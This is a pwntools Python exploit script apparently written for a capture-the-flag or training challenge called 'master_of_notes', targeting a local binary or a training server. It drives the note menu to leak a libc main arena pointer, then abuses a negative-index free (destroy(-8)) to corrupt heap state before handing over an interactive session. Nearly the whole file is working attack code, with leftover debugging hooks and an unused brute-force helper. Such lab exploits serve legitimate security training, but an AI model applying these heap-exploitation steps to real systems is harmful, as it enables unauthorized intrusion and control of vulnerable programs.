import time
from pwn import *
import sys

if(len(sys.argv)>1):
	run_local = False
else:
	run_local = True




SIZE=90

if "REMOTE" not in args:
	r= process('./master_of_notes_patched')
else:
	r = remote("bin.training.offdef.it",4004)


def register(name,password):
	r.recvuntil(b"> ")
	r.sendline(b"1")
	r.recvuntil(b": ")
	r.send(b"%s" % name)
	r.recvuntil(b": ")
	r.sendline(b"%s" % password)

def login(name,password):
	r.recvuntil(b"> ")
	r.sendline(b"2")
	r.recvuntil(b": ")
	r.send(b"%s" % name)
	r.recvuntil(b": ")
	r.sendline(b"%s" % password)

def make(index,size):
	r.recvuntil(b"> ")
	r.sendline(b"1")
	r.recvuntil(b": ")
	r.sendline(b"%d" % index)
	r.recvuntil(b": ")
	r.sendline(b"%d" % size)

def print0():
	r.recvuntil(b"> ")
	r.sendline(b"3")
	r.recvuntil(":")
	r.recvuntil(": ")
	return hex(u64(r.recv(6)+b'\x00\x00'))

def destroy(index):
	r.recvuntil(b"> ")
	r.sendline(b"4")
	r.recvuntil(b": ")
	r.sendline(b"%d" % index)


def brute(tri):
	#gdb.attach(r)
	#input("wait")
	make(1,tri)
	sleep(0.1)
	r.sendline(b'2')
	sleep(0.1)
	r.sendline(b'1')
	sleep(0.1)
	r.sendline(b'k'*8)
	sleep(0.1)
	r.sendline(b'3')
	r.recvuntil(b">")
	r.recvuntil(b"menu:")
	r.recvuntil(b"Note:")
	print(r.recvuntil(b"menu:"))
	destroy(1)
	sleep(1)

gdb.attach(r)
input('dog')
register(b"Master of Notes\x00",b"merda")
login(b"Master of Notes\x00",b"merda")
make(0,10)
leak=print0()
print("[!]MAIN ARENA: "+leak+" [!]")
destroy(-8)
r.sendline(b'5')
r.sendline(b'3')
r.send(b'\x00'*8)
r.interactive()
